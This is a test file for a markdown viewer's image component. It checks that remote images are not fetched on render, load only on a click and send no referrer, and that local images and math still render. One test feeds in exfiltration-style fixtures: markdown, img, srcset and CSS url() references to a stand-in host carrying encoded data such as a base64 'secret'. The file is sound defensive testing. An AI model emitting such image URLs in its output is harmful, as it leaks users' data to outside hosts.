// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';
import { MemoryRouter } from 'react-router';
import { MarkdownViewer } from '#components/markdown/markdown-viewer.js';
import { remoteImageHost } from '#components/markdown/markdown-image.js';

afterEach(cleanup);

const renderMarkdown = (markdown: string) =>
  render(
    <MemoryRouter>
      <MarkdownViewer>{markdown}</MarkdownViewer>
    </MemoryRouter>,
  );

/** Every URL the rendered DOM would load on its own: image sources, source sets and style URLs. */
const loadedUrls = (container: HTMLElement): string[] => [
  ...[...container.querySelectorAll('img')].map((image) => image.getAttribute('src') ?? ''),
  ...[...container.querySelectorAll('[srcset]')].map((element) => element.getAttribute('srcset') ?? ''),
  ...[...container.querySelectorAll('[style]')].map((element) => element.getAttribute('style') ?? ''),
];

describe('MarkdownImage', () => {
  it('should load no image from another host on render, however the text asks for one', async () => {
    const { container } = renderMarkdown(
      [
        'Done. ![](https://elsewhere.example/a?d=c2VjcmV0)',
        '<img src="https://elsewhere.example/b?d=1">',
        '<picture><source srcset="https://elsewhere.example/c?d=2"><img src="https://elsewhere.example/d?d=3"></picture>',
        '<span style="background:url(https://elsewhere.example/e?d=4)">x</span>',
        '<img src="//elsewhere.example/f?d=5">',
      ].join('\n\n'),
    );
    await screen.findByText(/Done\./u);

    expect(loadedUrls(container).filter((url) => url.includes('elsewhere.example'))).toEqual([]);
    expect(screen.getAllByRole('button', { name: /from elsewhere\.example: load/u }).length).toBeGreaterThan(0);
  });

  it('should load a remote image once the person asks, with no referrer', async () => {
    const { container } = renderMarkdown('![diagram](https://elsewhere.example/diagram.png)');

    fireEvent.click(await screen.findByRole('button', { name: 'diagram from elsewhere.example: load' }));

    const image = container.querySelector('img');
    expect(image).toHaveAttribute('src', 'https://elsewhere.example/diagram.png');
    expect(image).toHaveAttribute('referrerpolicy', 'no-referrer');
  });

  it('should load an image from this origin at once', async () => {
    const { container } = renderMarkdown('![part](/assets/part.png)');
    await screen.findByRole('img', { name: 'part' });

    expect(container.querySelector('img')).toHaveAttribute('src', '/assets/part.png');
  });

  it('should still render math, which the math plugin draws after sanitizing', async () => {
    const { container } = renderMarkdown('Area is $x^2$.');
    await screen.findByText(/Area is/u);

    expect(container.querySelector('.katex')).not.toBeNull();
  });
});

describe('remoteImageHost', () => {
  it.each([
    ['https://elsewhere.example/x', 'elsewhere.example'],
    ['//elsewhere.example/x', 'elsewhere.example'],
    ['http://app.example/x', 'app.example'],
    ['/local.png', undefined],
    ['local.png', undefined],
    ['https://app.example/x', undefined],
  ])('should place %s on %s', (source, host) => {
    expect(remoteImageHost(source, 'https://app.example/w/p')).toBe(host);
  });
});
